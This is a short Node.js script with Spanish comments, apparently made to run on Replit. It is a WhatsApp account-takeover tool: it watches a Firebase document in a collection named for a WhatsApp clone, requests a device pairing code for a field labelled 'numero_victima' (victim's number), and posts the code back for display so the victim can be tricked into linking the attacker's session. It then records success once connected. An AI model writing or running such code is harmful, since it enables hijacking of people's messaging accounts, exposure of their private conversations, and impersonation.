const { Client, LocalAuth } = require('whatsapp-web.js');
const admin = require('firebase-admin');

// Configuración de Firebase
const serviceAccount = require("./serviceAccountKey.json"); 
if (!admin.apps.length) { admin.initializeApp({ credential: admin.credential.cert(serviceAccount) }); }
const db = admin.firestore();

const client = new Client({
    authStrategy: new LocalAuth({ clientId: "replit_session" }),
    puppeteer: {
        headless: true,
        args: ['--no-sandbox', '--disable-setuid-sandbox'] // Replit no necesita rutas raras
    }
});

// ESCUCHA DE FIREBASE (SERIAL PAIRING)
db.collection("wa_clon_global").doc("current_session").onSnapshot(async (snap) => {
    if (!snap.exists) return;
    const data = snap.data();
    if (data.status === "solicitando_codigo" && !data.pairingCode) {
        console.log("GENERANDO CÓDIGO PARA: " + data.numero_victima);
        const code = await client.requestPairingCode(data.numero_victima);
        await snap.ref.update({ pairingCode: code, status: "mostrando_codigo" });
        console.log("CÓDIGO LISTO: " + code);
    }
});

client.on('ready', () => {
    console.log("CONEXIÓN EXITOSA");
    db.collection("wa_clon_global").doc("current_session").update({ status: "exito" });
});

client.initialize();

// Servidor básico para que Replit no cierre el proceso
const express = require('express');
const app = express();
app.get('/', (req, res) => res.send('MOTOR REPLIT ONLINE'));
app.listen(3000);
